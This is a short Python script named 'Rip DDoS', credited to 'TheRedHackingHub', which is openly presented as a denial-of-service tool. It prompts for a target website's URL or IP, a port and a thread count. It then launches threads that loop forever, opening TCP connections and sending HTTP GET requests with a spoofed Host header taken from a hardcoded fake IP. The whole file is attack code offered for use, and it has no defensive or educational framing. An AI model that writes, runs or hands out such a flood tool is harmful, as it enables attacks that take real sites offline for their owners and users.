import socket
import threading
from colorama import Fore

txt = Fore.RED + "Rip DDoS\nCreated By TheRedHackingHub"
x = txt.center(50)

print(x)



try:
	method_of_target = input("Do You Want To Use URL/IP of The Targeted Website(url/ip): ")
	if "url" in method_of_target:
		target = input("[+] Website URL: ")
		target = socket.gethostbyname(str(target))	
	elif "ip" in method_of_target:
		target = input("[+] Website IP: ")
	else:
		print("Unknown Command. Use \"ip\" or \"url\"")
	fake_ip = "162.154.18.80"
	port = int(input("[+] Website PORT: "))
	threading_count = int(input("[+] How Many Threads To Apply: "))

	attack_num = 0

	def attack():
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			s.sendto(("GET / " + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))		
			global attack_num
			attack_num += 1
			print(attack_num)

			s.close()
		
	for i in range(threading_count):
		thread = threading.Thread(target=attack)
		thread.start()
	i = input("Write \"QUIT\" to exit: ")
	if i == "QUIT":
		exit()
except KeyboardInterrupt:
	print()
	print("[+] Program Closed")
